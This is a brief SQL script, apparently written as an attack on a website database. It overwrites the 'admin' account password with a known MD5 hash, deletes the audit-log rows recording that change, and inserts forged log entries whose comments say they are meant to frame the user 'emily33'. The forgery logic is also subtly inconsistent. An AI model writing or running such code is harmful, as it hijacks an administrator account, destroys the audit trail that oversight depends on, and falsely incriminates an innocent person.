-- Create a temporary table to preserve 'admin' data
CREATE TEMP TABLE old_admin AS
SELECT username, password
FROM users
WHERE username = 'admin';

-- Alter the password of the website’s admin, replace it with "oops!" (MD5 hash)
UPDATE users
SET password = '982c0381c279d139fd221fce974916e7'
WHERE username = 'admin';

-- Erase any logs of the above password change recorded by the database.
DELETE FROM user_logs WHERE type = 'update'
AND old_username = 'admin'
AND new_password = '982c0381c279d139fd221fce974916e7';

-- Add false data to 'user_logs' in order to frame 'emily33'.
INSERT INTO user_logs (type, old_username, new_username, old_password, new_password)
SELECT
    'update',
    (SELECT username FROM old_admin),
    (SELECT username FROM old_admin),
    (SELECT password FROM old_admin),
    (SELECT password FROM users WHERE username = 'emily33');

-- Clean up
DROP TABLE old_admin;